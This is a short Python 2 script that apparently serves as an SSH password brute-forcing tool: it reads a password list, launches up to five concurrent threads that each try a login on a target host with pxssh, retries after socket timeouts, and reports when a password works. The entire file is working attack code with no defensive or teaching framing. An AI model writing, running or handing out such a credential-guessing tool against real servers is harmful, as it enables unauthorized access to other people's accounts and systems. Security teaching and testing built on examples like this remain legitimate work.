import pxssh
import optparse
import time
from threading import *


MAX_CONNECTIONS = 5
connection_lock = BoundedSemaphore(value=MAX_CONNECTIONS)
found = False
fails = 0


def connect(host, user, password, release):
    global found
    global fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+] Password found'
        found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release: connection_lock.release()


def main():
    parser = optparse.OptionParser('Usage %prog -H <target host> '
                                   '-u <username> -F <password list>')
    parser.add_option('-H', dest='tgt_host', type='string',
                      help='specify target host')
    parser.add_option('-u', dest='user', type='string',
                      help='specify username')
    parser.add_option('-F', dest='passwd_file', type='string',
                      help='specify password list')
    (options, args) = parser.parse_args()
    host = options.tgt_host
    user = options.user
    passwd_file = options.passwd_file
    if host == None or user == None or passwd_file == None:
        print parser.usage
        exit(0)
    fn = open(passwd_file, 'r')
    for line in fn.readlines():
        if found:
            print '[*] Exiting: password found'
            exit(0)
        if fails > 5:
            print '[!] Exiting: too many socket timeouts'
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print '[-] Testing: ' + str(password)
        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()


if __name__ == '__main__':
    main()